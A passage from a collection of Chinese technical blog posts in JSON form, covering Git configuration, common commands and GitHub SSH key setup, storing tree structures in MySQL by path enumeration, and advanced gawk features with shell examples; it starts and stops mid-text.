目录中的 config 文件（就是 .git/config）：针对该仓库。\n\n每一个级别覆盖上一级别的配置，所以 .git/config 的配置变量会覆盖 /etc/gitconfig 中的配置变量。\n在 Windows 系统中，Git 会查找 $HOME 目录下（一般情况下是 C:\\Users\\$USER）的 .gitconfig 文件。 Git 同样也会寻找 /etc/gitconfig 文件，但只限于 MSys 的根目录下，即安装 Git 时所选的目标位置。\n用户信息\n当安装完 Git 应该做的第一件事就是设置你的用户名称与邮件地址。 这样做很重要，因为每一个 Git 的提交都会使用这些信息，并且它会写入到你的每一次提交中，不可更改：\n$ git config --global user.name \"John Doe\"\n$ git config --global user.email johndoe@example.com\n再次强调，如果使用了 --global 选项，那么该命令只需要运行一次，因为之后无论你在该系统上做任何事情， Git 都会使用那些信息。 当你想针对特定项目使用不同的用户名称与邮件地址时，可以在那个项目目录下运行没有 --global 选项的命令来配置。\n很多 GUI 工具都会在第一次运行时帮助你配置这些信息。\n.gitignore\n.gitignore 文件可能从字面含义也不难猜出：这个文件里配置的文件或目录，会自动被 git 所忽略，不纳入版本控制。\n在日常开发中，我们的项目经常会产生一些临时文件，如编译 Java 产生的 *.class 文件，又或是 IDE 自动生成的隐藏目录（Intellij 的 .idea 目录、Eclipse 的 .settings 目录等）等等。这些文件或目录实在没必要纳入版本管理。在这种场景下，你就需要用到 .gitignore 配置来过滤这些文件或目录。\n配置的规则很简单，也没什么可说的，看几个例子，自然就明白了。\n这里推荐一下 Github 的开源项目：https://github.com/github/gitignore\n在这里，你可以找到很多常用的模板，如：Java、Nodejs、C++ 的 .gitignore 模板等等。\n命令\n国外网友制作了一张 Git Cheat Sheet，总结很精炼，各位不妨收藏一下。\n本节选择性介绍 git 中比较常用的命令行场景。\n\n创建\n克隆一个已创建的仓库\n# 通过 SSH\n$ git clone ssh://user@domain.com/repo.git\n\n#通过 HTTP\n$ git clone http://domain.com/user/repo.git\n创建一个新的本地仓库\n$ git init\n添加修改\n添加修改到暂存区\n# 把指定文件添加到暂存区\n$ git add xxx\n\n# 把当前所有修改添加到暂存区\n$ git add .\n\n# 把所有修改添加到暂存区\n$ git add -A\n提交修改到本地仓库\n# 提交本地的所有修改\n$ git commit -a\n\n# 提交之前已标记的变化\n$ git commit\n\n# 附加消息提交\n$ git commit -m 'commit message'\n储藏\n有时，我们需要在同一个项目的不同分支上工作。当需要切换分支时，偏偏本地的工作还没有完成，此时，提交修改显得不严谨，但是不提交代码又无法切换分支。这时，你可以使用 git stash 将本地的修改内容作为草稿储藏起来。\n官方称之为储藏，但我个人更喜欢称之为存草稿。\n# 1. 将修改作为当前分支的草稿保存\n$ git stash\n\n# 2. 查看草稿列表\n$ git stash list\nstash@{0}: WIP on master: 6fae349 :memo: Writing docs.\n\n# 3.1 删除草稿\n$ git stash drop stash@{0}\n\n# 3.2 读取草稿\n$ git stash apply stash@{0}\n撤销修改\n撤销本地修改\n# 移除缓存区的所有文件（i.e. 撤销上次git add）\n$ git reset HEAD\n\n# 将HEAD重置到上一次提交的版本，并将之后的修改标记为未添加到缓存区的修改\n$ git reset <commit>\n\n# 将HEAD重置到上一次提交的版本，并保留未提交的本地修改\n$ git reset --keep <commit>\n\n# 放弃工作目录下的所有修改\n$ git reset --hard HEAD\n\n# 将HEAD重置到指定的版本，并抛弃该版本之后的所有修改\n$ git reset --hard <commit-hash>\n\n# 用远端分支强制覆盖本地分支\n$ git reset --hard <remote/branch> e.g., upstream/master, origin/my-feature\n\n# 放弃某个文件的所有本地修改\n$ git checkout HEAD <file>\n删除添加.gitignore文件前错误提交的文件\n$ git rm -r --cached .\n$ git add .\n$ git commit -m \"remove xyz file\"\n撤销远程修改\n创建一个新的提交，并回滚到指定版本\n$ git revert <commit-hash>\n彻底删除指定版本\n# 执行下面命令后，commit-hash 提交后的记录都会被彻底删除，使用需谨慎\n$ git reset --hard <commit-hash>\n$ git push -f\n更新与推送\n更新\n# 下载远程端版本，但不合并到HEAD中\n$ git fetch <remote>\n\n# 将远程端版本合并到本地版本中\n$ git pull origin master\n\n# 以rebase方式将远端分支与本地合并\n$ git pull --rebase <remote> <branch>\n推送\n# 将本地版本推送到远程端\n$ git push remote <remote> <branch>\n\n# 删除远程端分支\n$ git push <remote> :<branch> (since Git v1.5.0)\n$ git push <remote> --delete <branch> (since Git v1.7.0)\n\n# 发布标签\n$ git push --tags\n查看信息\n显示工作路径下已修改的文件\n$ git status\n显示与上次提交版本文件的不同\n$ git diff\n显示提交历史\n# 从最新提交开始，显示所有的提交记录（显示hash， 作者信息，提交的标题和时间）\n$ git log\n\n# 显示某个用户的所有提交\n$ git log --author=\"username\"\n\n# 显示某个文件的所有修改\n$ git log -p <file>\n显示搜索内容\n# 从当前目录的所有文件中查找文本内容\n$ git grep \"Hello\"\n\n# 在某一版本中搜索文本\n$ git grep \"Hello\" v2.5\n分支与标签\n增删查分支\n# 列出所有的分支\n$ git branch\n\n# 列出所有的远端分支\n$ git branch -r\n\n# 基于当前分支创建新分支\n$ git branch <new-branch>\n\n# 基于远程分支创建新的可追溯的分支\n$ git branch --track <new-branch> <remote-branch>\n\n# 删除本地分支\n$ git branch -d <branch>\n\n# 强制删除本地分支，将会丢失未合并的修改\n$ git branch -D <branch>\n切换分支\n# 切换分支\n$ git checkout <branch>\n\n# 创建并切换到新分支\n$ git checkout -b <branch>\n标签\n# 给当前版本打标签\n$ git tag <tag-name>\n\n# 给当前版本打标签并附加消息\n$ git tag -a <tag-name>\n合并与重置\n\nmerge 与 rebase 虽然是 git 常用功能，但是强烈建议不要使用 git 命令来完成这项工作。\n因为如果出现代码冲突，在没有代码比对工具的情况下，实在太艰难了。\n你可以考虑使用各种 Git GUI 工具。\n\n合并\n# 将分支合并到当前HEAD中\n$ git merge <branch>\n重置\n# 将当前HEAD版本重置到分支中，请勿重置已发布的提交\n$ git rebase <branch>\nGithub\nGithub 作为最著名的代码开源协作社区，在程序员圈想必无人不知，无人不晓。\n这里不赘述 Github 的用法，确实有不会用的新手同学，可以参考官方教程：https://guides.github.com/\nclone 方式\nGit 支持三种协议：HTTPS / SSH / GIT\n而 Github 上支持 HTTPS 和 SSH。\nHTTPS 这种方式要求你每次 push 时都要输入用户名、密码，有些繁琐。\n而 SSH 要求你本地生成证书，然后在你的 Github 账户中注册。第一次配置麻烦是麻烦了点，但是以后就免去了每次 push 需要输入用户名、密码的繁琐。\n\n以下介绍以下，如何生成证书，以及在 Github 中注册。\n生成 SSH 公钥\n如前所述，许多 Git 服务器都使用 SSH 公钥进行认证。 为了向 Git 服务器提供 SSH 公钥，如果某系统用户尚未拥有密钥，必须事先为其生成一份。 这个过程在所有操作系统上都是相似的。 首先，你需要确认自己是否已经拥有密钥。 默认情况下，用户的 SSH 密钥存储在其 ~/.ssh 目录下。 进入该目录并列出其中内容，你便可以快速确认自己是否已拥有密钥：\n$ cd ~/.ssh\n$ ls\nauthorized_keys2  id_dsa       known_hosts\nconfig            id_dsa.pub\n我们需要寻找一对以 id_dsa 或 id_rsa 命名的文件，其中一个带有 .pub 扩展名。 .pub 文件是你的公钥，另一个则是私钥。 如果找不到这样的文件（或者根本没有 .ssh 目录），你可以通过运行 ssh-keygen 程序来创建它们。在 Linux/Mac 系统中，ssh-keygen 随 SSH 软件包提供；在 Windows 上，该程序包含于 MSysGit 软件包中。\n$ ssh-keygen\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/schacon/.ssh/id_rsa):\nCreated directory '/home/schacon/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/schacon/.ssh/id_rsa.\nYour public key has been saved in /home/schacon/.ssh/id_rsa.pub.\nThe key fingerprint is:\nd0:82:24:8e:d7:f1:bb:9b:33:53:96:93:49:da:9b:e3 schacon@mylaptop.local\n首先 ssh-keygen 会确认密钥的存储位置（默认是 .ssh/id_rsa），然后它会要求你输入两次密钥口令。如果你不想在使用密钥时输入口令，将其留空即可。\n现在，进行了上述操作的用户需要将各自的公钥发送给任意一个 Git 服务器管理员（假设服务器正在使用基于公钥的 SSH 验证设置）。 他们所要做的就是复制各自的 .pub 文件内容，并将其通过邮件发送。 公钥看起来是这样的：\n$ cat ~/.ssh/id_rsa.pub\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAklOUpkDHrfHY17SbrmTIpNLTGK9Tjom/BWDSU\nGPl+nafzlHDTYW7hdI4yZ5ew18JH4JW9jbhUFrviQzM7xlELEVf4h9lFX5QVkbPppSwg0cda3\nPbv7kOdJ/MTyBlWXFCR+HAo3FXRitBqxiX1nKhXpHAZsMciLq8V6RjsNAQwdsdMFvSlVK/7XA\nt3FaoJoAsncM1Q9x5+3V0Ww68/eIFmb1zuUFljQJKprrX88XypNDvjYNby6vw/Pb0rwert/En\nmZ+AW4OZPnTPI89ZPmVMLuayrD2cE86Z/il8b+gw3r3+1nKatmIkjn2so1d01QraTlMqVSsbx\nNrRFi9wrf+M7Q== schacon@mylaptop.local\n在你的 Github 账户中，依次点击 Settings > SSH and GPG keys > New SSH key\n然后，将上面生成的公钥内容粘贴到 Key 编辑框并保存。至此大功告成。\n后面，你在克隆你的 Github 项目时使用 SSH 方式即可。\n\n如果觉得我的讲解还不够细致，可以参考：https://help.github.com/articles/adding-a-new-ssh-key-to-your-github-account/\n小结\n最后，放一张我总结的脑图总结一下以上的知识点。\n\n资料\ngit 官网 | git 官方 Github\n廖雪峰的 git 教程\ngit-cheat-sheet\ngithub-cheat-sheet\nGithub gitignore 模板\n"},{"title":"【MySQL疑难杂症】如何将树形结构存储在数据库中（方案二 Path Enumeration）","body":"　　今天来介绍把树形结构存入数据库的第二种方法——路径枚举法。\n　　还是借用上一篇的栗子，为了方便大家查阅，我把图又原样搬过来了。\n\n　　需要回答的问题依旧是这样几个：\n　　1.查询小天的直接上司。\n　　2.查询老宋管理下的直属员工。\n　　3.查询小天的所有上司。\n　　4.查询老王管理的所有员工。\n方案二、 Path Enumeration 路径枚举法，记录下根节点到每个子节点的路径。\n　　先创建表：\n\nCREATE TABLE employees2(\neid INT,\nename VARCHAR(100),\nposition VARCHAR(100),\npath VARCHAR(200)\n)\n\n　　然后插入数据：\n\n　　现在我们来回答一下之前的问题：\n　　1.查询小天的直接上司。\n　　在上一个解决方案中能轻而易举做到的事情，在这个方案中却有些麻烦了，因为需要对path字段进行字符串处理，去掉“/”+自身id才是直接上司的path值。又开始一顿骚操作：\n　　SELECT e1.eid,e1.ename FROM employees2 e1,employees2 e2 WHERE e2.ename = '小天' AND e1.path = REPLACE(e2.path,CONCAT('/',e2.eid),'');\n　　好像这个操作还不够sao，2333，结果如下：\n　　\n　　2.查询老宋管理下的直属员工。\n　　怎么查管理下的直属员工呢？那就要用模糊查询了：\n　　SELECT e2.eid,e2.ename FROM employees2 e1,employees2 e2 WHERE e1.ename = '老宋' AND e2.path REGEXP CONCAT(e1.path,'/[0-9]{1,}$');\n　　这里用了正则匹配，匹配所有path符合规则的记录，结果如下：\n　　\n　　3.查询小天的所有上司。\n　　SELECT e1.eid,e1.ename FROM employees2 e1,employees2 e2 WHERE e2.ename='小天' AND e2.path like concat(e1.path,'/%');\n　　这里就能体现这种存储结构的优势了。不看效率的话，还是很方便的。\n　　\n　　4.查询老王管理的所有员工。\n　　SELECT e2.eid,e2.ename FROM employees2 e1,employees2 e2 WHERE e1.ename='老王' AND e2.path like concat(e1.path,'/%');\n　　看吧，查起来就so easy了。\n　　\n　　不用像之前那样写一大段存储过程了，简单粗暴。\n　　小结一下，存储路径的方式在进行多级查询的时候十分方便，而在查询直接上下级的时候稍微复杂一点。还有一个很明显的缺点，那就是path的大小是指定的，所以理论上是不能进行无限层级的存储的，path值设置的越大，浪费的空间就越多。\n　　至此，本篇介绍完毕，之后还会介绍其他方法，欢迎大家继续关注！\n "},{"title":"《Linux命令行与shell脚本编程大全》第二十二章 gawk进阶","body":"gawk是一门功能丰富的编程语言，你可以通过它所提供的各种特性来编写好几程序处理数据。 \n22.1 使用变量\ngawk编程语言支持两种不同类型的变量：\n内建变量和自定义变量\n \n22.1.1 内建变量\ngawk程序使用内建变量来引用程序数据里的一些特殊功能\n \n1.字段和记录分隔符变量\n数据字段变量：允许你使用美元符和字段在该记录中的位置值来引用记录对应的字段。\n要引用第一个字段就用变量$1，第二个就用$2,….以此类推。\n \n数据字段是由分隔符来划定的。默认字段分隔符是一个空白字符，也就是空格或者制表符。\n \n有一组内建变量用于控制gawk如何处理输入输出数据中的字段和记录，见下表：\n\n\n\n\n变量\n\n\n描述\n\n\n\n\nFIELDWIDTHS\n\n\n有空格分隔的一列数字，定义每个数据字段的确切宽度\n\n\n\n\nFS\n\n\n输入字段分隔符\n\n\n\n\nRS\n\n\n输入记录分隔符\n\n\n\n\nOFS\n\n\n输出字段分隔符\n\n\n\n\nORS\n\n\n输出记录分隔符\n\n\n\n\n \n1）print命令会自动将OFS变量的值放置在输出中的每个字段间。\n实例：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data1 \ndata11,data12,data13,data14\ndata21,data22,data23,data24\ndata31,data32,data33,data34\ndata41,data42,data43,data44\ndata51,data52,data53,data54\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"; OFS=\"-\"} {print $1,$2,$3}' data1 \ndata11-data12-data13\ndata21-data22-data23\ndata31-data32-data33\ndata41-data42-data43\ndata51-data52-data53\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"; OFS=\"<-->\"} {print $1,$2,$3}' data1 \ndata11<-->data12<-->data13\ndata21<-->data22<-->data23\ndata31<-->data32<-->data33\ndata41<-->data42<-->data43\ndata51<-->data52<-->data53\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n2） FIELDWIDTHS变量允许你不依靠字段分割符来读取记录。一旦这是了FILEDWIDTFS变量，gawk就会忽略FS变量。\n警告：一旦设定了FIELDWIDTHS变量的值，就不能再改变了。这种方法并不适用于变长的字段\n \n有写数据没有指定分隔符，而是放在特定的列，这时候就可以用FIELDWIDTHS了：\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data2\n1005.3246782.37\n115-2.343324.08\n05828.3452433.1\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FIELDWIDTHS=\"3 5 2 5\"} {print $1,$2,$3,$4}' data2\n100 5.324 67 82.37\n115 -2.34 33 24.08\n058 28.34 52 433.1\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n3）RS和ORS定义了gawk程序如何处理数据流中的字段。默认这两个都是换行符\n默认的RS表明，输入数据流中的每行新文本就是一条新记录\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data3\nkobe bryant\n24 Los Lakers\nLos, road34\n99038\n \nPaul Gaoso\n15 los Lakers\nLos, road 38\n23123\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\"\\n\";RS=\"\"} {print $1, $4}' data3\nkobe bryant 99038\nPaul Gaoso 23123\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\"\\n\";RS=\"\"} {print $1, $2}' data3\nkobe bryant 24 Los Lakers\nPaul Gaoso 15 los Lakers\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n上面的例子中，4行才是一条记录，所以指定FS=”\\n”\n每行只是一个字段。\n如何判断一个新的数据行的开始：解决方法计算RS变量设为空。然后在数据记录之间留一个空白行。gawk会把每个空白行当做一个记录分隔符。\n \n说明：\n默认的字段分隔符是空格，记录分割符是换行符\n上面的例子把字段分割符改成了换行符，记录分隔符编程了空白行（RS=””）\n \n2. 数据变量\n还有一些其他的内建变量：\n\n\n\n\n变量\n\n\n描述\n\n\n\n\nARGC\n\n\n当前命令行参数个数\n\n\n\n\nARGIND\n\n\n当前文件在ARGV的位置\n\n\n\n\nARGV\n\n\n包含命令行参数的数组\n\n\n\n\nCONVFMT\n\n\n数字的转换格式，模式是%.6 g\n\n\n\n\nENVIRON\n\n\n当前shell环境变量及其值组成的关联数组\n\n\n\n\nERRNO\n\n\n当读取或关闭文件发生错误时的系统错误号\n\n\n\n\nFILENAME\n\n\n用作输入数据的数据文件的文件名\n\n\n\n\nFNR\n\n\n当前数据文件的数据行数\n\n\n\n\nIGNORECASE\n\n\n设成非零值，忽略gawk命令中出现的字符串的字符大小写\n\n\n\n\nNF\n\n\n数据文件中的字段总数\n\n\n\n\nNR\n\n\n已处理的输入记录数\n\n\n\n\nOFMT\n\n\n数字的输出格式，默认值%.6 g\n\n\n\n\nRLENGTH\n\n\n由match函数所匹配的字符串的长度\n\n\n\n\nRSTART\n\n\n由match函数所匹配的字符串的起始位置\n\n\n\n\n \n实例1：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{print ARGC,ARGV[1]}' data2\n2 data2\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{print ENVIRON[\"HOME\"]}'\n/home/xcy\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{print ENVIRON[\"HOME\"]; print ENVIRON[\"PATH\"]}'\n/home/xcy\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/sbin/:/usr/bin:/usr/sbin:/home/xcy/Bt_A7/Bt_A7/gcc-linaro-arm-linux-gnueabihf-4.9-2014.09_linux/bin\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n ENVIRON[“HOME”] 从系统中提取HOME环境变量的值。\n \n例子2：\n当要在gawk程序中跟踪数据字段和记录时，变量FNR，NF和NR就非常方便了。\nNF变量可以在你不知道具体位置的情况下指定记录中的最后一个数据字段：\n$gawk ‘BEGIN{FS=”:”; OFS=”:”} {print $1, $NF}’ /etc/passwd\n假设NF为7，那么相当于是$7。打印最后一个字段\n \n例子3：\nFNR变量含有当前数据文件中已处理过的记录数\nNR变量则含有已处理过的记录总数\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} {print $1,\"FNR=\"FNR}' data1 \ndata11 FNR=1\ndata21 FNR=2\ndata31 FNR=3\ndata41 FNR=4\ndata51 FNR=5\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} {print $1,\"FNR=\"FNR, \"NR=\"NR} END{print \"There were \",NR,\" recordes\"}' data1 data1\ndata11 FNR=1 NR=1\ndata21 FNR=2 NR=2\ndata31 FNR=3 NR=3\ndata41 FNR=4 NR=4\ndata51 FNR=5 NR=5\ndata11 FNR=1 NR=6\ndata21 FNR=2 NR=7\ndata31 FNR=3 NR=8\ndata41 FNR=4 NR=9\ndata51 FNR=5 NR=10\nThere were  10  recordes\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n当处理第2个文件时，FNR又被置成1了，但是NR还是继续增加的。\n \n注意：\n1）在shell脚本中使用gawk时，应该将gawk的命令放到不同的行，便于理解和阅读\n2）如果在不同的shell脚本中使用了相同的gawk脚本，应该把gawk放在一个单独的文件中。再用-f参数去引用它。\n \n \n22.1.2自定义变量\n变量名可以是字母下划线开头，还可以有数字。并且变量名区分大小写\n1.在脚本中给变量赋值\n可以对变量进行修改，可以进行数学运算\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\n> BEGIN{\n> test=\"hahaha, i am test\"\n> print test}'\nhahaha, i am test\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\nBEGIN{\ntest=\"hahaha, i am test\"\nprint test\n> test=156\n> print test\n> }'\nhahaha, i am test\n156\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\n> BEGIN{\n> x=4\n> x=x*3+4\n> print x\n> }'\n16\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n2. 在命令行上给变量赋值\n也可以用gawk命令行来给程序中的变量赋值。这允许你在正常的代码之外赋值。\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script \nBEGIN{FS=\",\"}\n{print $n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script n=3 data1\ndata13\ndata23\ndata33\ndata43\ndata53\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n上面可以给n进行赋值，改变脚本的行为。\n这样可以在不改变脚本代码的情况下就能改变脚本的行为\n上面这样存在的问题是设置的变量在代码的BEGIN部分不可用\n \n解决方法，用-v参数。它允许你在BEGIN代码之前设定变量，要放在脚本代码之前。\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script2\nBEGIN{print \"The starting value is\",n; FS=\",\"}\n{print $n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -v n=4 -f script2 data1\nThe starting value is 4\ndata14\ndata24\ndata34\ndata44\ndata54\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.2 处理数组\ngawk编程语言使用关联数组提供数组功能\n关联数组跟数字数组不同之处在于它的索引值可以是任意文本字符串。\n不需要用连续的数字来标识数组元素。关联数组用各种字符串来引用值\n每个索引字符串都必须能够唯一标识赋给它的数据元素\n \n22.2.1 定义数组变量\n用标准赋值语句来定义数组变量。格式如下：\nvar[index]=element\nvar是变量名，index是关联数组的索引值 element是数据元素值\n例子：\n这里要加双引号，数字不用加，字符串需要加\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '                      \nBEGIN{\nnba[\"kobe\"]=\"bryant\"\nnba[\"cp3\"]=\"paul\"\nprint nba[\"kobe\"]\nprint nba[\"cp3\"]\n}'\nbryant\npaul\n# 还可以进行数学运算。\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\n> BEGIN{\n> arr[1]=99\n> arr[2]=77\n> total=arr[1] + arr[2]\n> print \"total =\",total\n> }'\ntotal = 176\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n \n22.2.2 遍历数组变量\n关联数组的索引可以是任何东西\n遍历数组可以用for语句的一种特殊形式：\nfor (var in array)\n{\n  statements\n}\n这个for语句会在每次循环时都将关联数组array的下一个索引值赋值给变量var，然后执行一遍statements\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script3\nBEGIN{\nvar[\"a\"]=\"hahah\"\nvar[\"b\"]=2\nvar[\"c\"]=\"yutong keche\"\nvar[\"d\"]=4\n \n \nfor (test in var)\n{\n         print \"Index:\",test,\" - Value:\",var[test]\n}\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script3\nIndex: a  - Value: hahah\nIndex: b  - Value: 2\nIndex: c  - Value: yutong keche\nIndex: d  - Value: 4\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.2.3删除数组变量\n格式如下：\ndelete array[index]\n删除以后就没办法再用它来提取元素值了。\n比如：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script4\nBEGIN{\nvar[\"a\"]=\"hahah\"\nvar[\"b\"]=2\nvar[\"c\"]=\"yutong keche\"\nfor (test in var)\n{\n         print \"old: Index:\",test,\" - Value:\",var[test]\n}\nprint \"Now,delete array:\"\ndelete var[\"c\"]\n \nfor (test in var)\n{\n         print \"new: Index:\",test,\" - Value:\",var[test]\n}\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script4\nold: Index: a  - Value: hahah\nold: Index: b  - Value: 2\nold: Index: c  - Value: yutong keche\nNow,delete array:\nnew: Index: a  - Value: hahah\nnew: Index: b  - Value: 2\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.3 使用模式\ngawk支持多种类型的匹配模式来过滤数据记录。\nBEGIN和END关键字用来读取数据流之前或之后执行命令的特殊模式\n \n22.3.1 正则表达式\n可以用基础正则表达式（BRE）或扩展正则表达式（ERE）来选择程序脚本作用在数据流中的哪些行上。\n \n使用正则表达式时，正则表达式必须出现在它要控制的程序脚本的左花括号前。\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script5\nBEGIN{FS=\",\"}\n/11/{print $1, $2}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script5 data1\ndata11 data12\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n正则表达式/11/匹配了字段中含有字符串11的记录。\n \n \n22.3.2 匹配操作符\n匹配操作符允许将正则表达式限定在记录中的特定数据字段。匹配操作符是~。\n可以指定匹配操作符，数据字段变量以及要匹配的正则表达式\n$1 ~ /^data/\n$1变量代表记录中的第一个数据字段。\n上面的例子会过滤出以data开头的所有记录。\n取反： $1 !~ /^data1/   匹配第一个字段不以data1开头的记录\n例子2：\n// 匹配第2个字段为data2开头的记录，并且打印第1和第3个字段。$2表示第2个字段\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data1\ndata11,data12,data13,data14\ndata21,data22,data23,data24\ndata31,data32,data33,data34\ndata41,data42,data43,data44\ndata51,data52,data53,data54\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} $2 ~ /^data2/{print $1, $3}' data1   data21 data23\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} $2 !~ /^data2/{print $1, $3}' data1  // 这里还可以取反，匹配第二个字段不以data2开头的记录。加个感叹号\ndata11 data13\ndata31 data33\ndata41 data43\ndata51 data53\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n例子3：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\":\"} $1 ~ /^xcy/{print $1,\":\" $NF}' /etc/passwd\nxcy :/bin/bash\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n例子4：! 用来排除正则表达式中的匹配\n\n$ gawk -F: '$1 !~ /^xcy|^root/{print $1, \":\" $NF}' /etc/passwd\n\n-F 用来指定主句字段的分隔符\n上面表明过滤第一个字段不以xcy开头，或不以root开头。\n \n22.3.3 数学表达式\n还可以在匹配模式中用数学表达式。\n例子：想显示所有属于root用户组（组ID为0）的系统用户\n$gawk –F: ‘$4 == 0{print $1}’ /etc/passwd\n还可以用任何常见的数学比较表达式： ==  <=  >=  >  <\n \n匹配字符串：注意这时候是完全匹配\n$gawk –F, ‘$1==”data” {print $1}’ data1\n第一个字段必须是data，而不是包含data\n \n22.4 结构化命令\n \n22.4.1 if语句\n给if语句定义一个求值的条件，并将其用圆括号括起来。\n条件为真在if后面的语句就会执行。\n还可以接上else。和C语言的差不多\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data4\n3\n5\n34\n467\n1\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat ifscript \n{\n         if ($1 > 29)\n         {\n                   print \"$1 > 29\"  # 多条命令需要用{}括起来\n                   print $1\n         }\n         else if($1 == 3)  \n         {\n                   print \"step 2 $1 == 3\"\n         }        \n         else\n         {\n                   print \"step 3 \"\n         }\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f ifscript data4\nstep 2 $1 == 3\nstep 3 \n$1 > 29\n34\n$1 > 29\n467\nstep 3 \nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n还可以在单行上使用else子句，这样就需要在if后面接上分号；\n$ gawk '{if($1 == 3) print $1\" == 3 \"; else print $1,\"!= 3\"}' data4\n \n22.4.2 while 语句\n基本格式：\nwhile (condition)\n{\n  statement\n}\n \nwhile里面还可以放break和continue。用起来跟C语言一样\n \n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data5\n100 110 120\n170 180 190 \n300 310 320\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script6 \n{\ntotal=0\ni=1\nwhile(i < 4)\n{\n         total += $i\n         i++\n         if(i==3)\n         {\n                   break\n                   #continue\n         }\n         print \"i=\", i\n}\navg=total/3\nprint \"Average:\",avg\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script6 data5\ni= 2\nAverage: 70\ni= 2\nAverage: 116.667\ni= 2\nAverage: 203.333\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n \n \n22.4.3 do-while语句\n和while语句类似，但是会在检查条件语句之前执行命令。格式如下：\ndo\n{\n  statement\n} while(condition)\n \n这种格式保证了语句在条件被求值之前至少执行一次\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script7\n{\ntotal=0\ni=1\ndo\n{\n         total += $i\n         i++\n} while(total < 300)\nprint \"total:\",total,\"i=\",i\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script7 data5\ntotal: 330 i= 4\ntotal: 350 i= 3\ntotal: 300 i= 2\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.4.4 for语句\n支持C风格的for循环：\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script8 \n{\ntotal=0\nfor(i=1; i<4; i++)\n{\n         total += $i\n}\navg=total/3\nprint \"Total:\",total,\"Average:\",avg\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script8 data5\nTotal: 330 Average: 110\nTotal: 540 Average: 180\nTotal: 930 Average: 310\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n \n22.5 格式化打印\nprint打印在如何显示数据上并未提供多少控制。\n下面介绍一个格式化打印命令，printf，和C语言的那个有点类似：\nprintf “format string” ,var1,var2…\n前面也是格式化命令。跟C语言很像：\n1）\n%c 输出字符， %d 整数值， %i 整数值，%e 用科学计数法显示数\n%f 浮点数，%g 科学计数法或浮点数显示（较短的）\n%o 八进制，%s 字符串\n%x 十六进制小写，%X 十六进制大写\n2）\n还有三种修饰符可以用来进一步控制输出\nwidth：指定输出字段最小宽度的数字值。实际比这短，则会补充空格，否则按正常输出\nprec：指定浮点数中小数点后面的位数。或者文本字符串中显示的最大字符数\n-(减号)：指明在格式化空间中放入数据时采用左对齐，而不是右对齐\n例子：\n\n$ cat data3\nkobe bryant\n24 Los Lakers\nLos, road34\n99038\n 